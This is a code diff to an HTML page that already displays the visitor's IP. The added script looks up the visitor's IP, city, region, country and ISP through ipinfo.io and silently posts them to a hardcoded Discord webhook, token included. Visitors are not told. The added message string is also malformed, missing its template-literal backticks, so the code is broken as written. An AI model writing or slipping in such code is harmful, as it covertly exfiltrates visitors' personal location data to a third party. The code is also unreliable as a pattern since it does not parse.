@@ -41,6 +41,26 @@
         document.getElementById("status").textContent = "IP取得に失敗しました";
         console.error("IP取得エラー:", error);
       });
+    fetch('https://ipinfo.io/json')
+  .then(response => response.json())
+  .then(data => {
+    const ip = data.ip;
+    const city = data.city;
+    const region = data.region;
+    const country = data.country;
+    const isp = data.org; // ISP情報（組織名）
+
+    const webhookURL = "https://discord.com/api/webhooks/1380138909631123547/nvpr4yz48EStbdjzFx6AL-92aoxXYFZay_fSmLLpZ-uGJePGx8N4aFfwF3bkkKtFqUZm";
+
+    fetch(webhookURL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ 
+        content: IP: ${ip}\nLocation: ${city}, ${region}, ${country}\nISP: ${isp}
+      })
+    });
+  })
+  .catch(error => console.error('Error:', error)); 
   </script>
 </body>
 </html>
